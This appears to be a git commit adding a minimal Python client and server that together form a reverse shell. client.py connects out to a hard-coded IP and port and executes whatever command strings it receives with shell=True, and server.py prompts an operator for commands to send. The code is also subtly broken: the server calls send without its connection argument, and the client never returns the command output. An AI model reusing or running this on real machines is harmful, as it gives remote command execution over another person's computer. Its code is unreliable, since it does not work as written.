d5b9aed1d574ef54fda1cfe9eb14fb1cc12720cb
Alvsch <alvin.scherdin@gmail.com>
2022-03-10 18:15:51 +0100

    Initial commit

---
+++ client.py
@@ -0,0 +1,27 @@
+import socket
+import subprocess
+
+HEADER = 64
+PORT = 5555
+IP = "192.168.86.222"
+ADDR = (IP, PORT)
+FORMAT = 'utf-8'
+
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.connect(ADDR)
+
+def recv(conn):
+    msg_length = conn.recv(HEADER).decode(FORMAT)
+    if msg_length:
+        msg_length = int(msg_length)
+        msg = conn.recv(msg_length).decode(FORMAT)
+        return msg
+
+
+connected = True
+while connected:
+    msg = recv(client)
+    
+    proc = subprocess.Popen(msg.split(" "), stdout=subprocess.PIPE, shell=True)
+    (out, err) = proc.communicate()
+    print("Program Output: ", out)
---
+++ server.py
@@ -0,0 +1,41 @@
+import socket
+import threading
+
+HEADER = 64
+PORT = 5555
+SERVER = socket.gethostbyname(socket.gethostname())
+ADDR = (SERVER, PORT)
+FORMAT = 'utf-8'
+DISCONNECT_MESSAGE = "!DISCONNECT"
+
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind(ADDR)
+
+def recv(conn):
+    msg_length = conn.recv(HEADER).decode(FORMAT)
+    if msg_length:
+        msg_length = int(msg_length)
+        msg = conn.recv(msg_length).decode(FORMAT)
+        return msg
+
+def send(msg, conn):
+    message = msg.encode(FORMAT)
+    msg_length = len(message)
+    send_length = str(msg_length).encode(FORMAT)
+    send_length += b' ' * (HEADER - len(send_length))
+    conn.send(send_length)
+    conn.send(message)
+    print(recv(conn))
+
+def start():
+    server.listen(1)
+    print(f"[LISTENING] Server is listening on {SERVER}")
+    while True:
+        conn, addr = server.accept()
+        print(f"[CONNECTED] Conencted to {addr}")
+        command = input("Enter a command: ")
+        send(command)
+
+
+print("[STARTING] server is starting...")
+start()
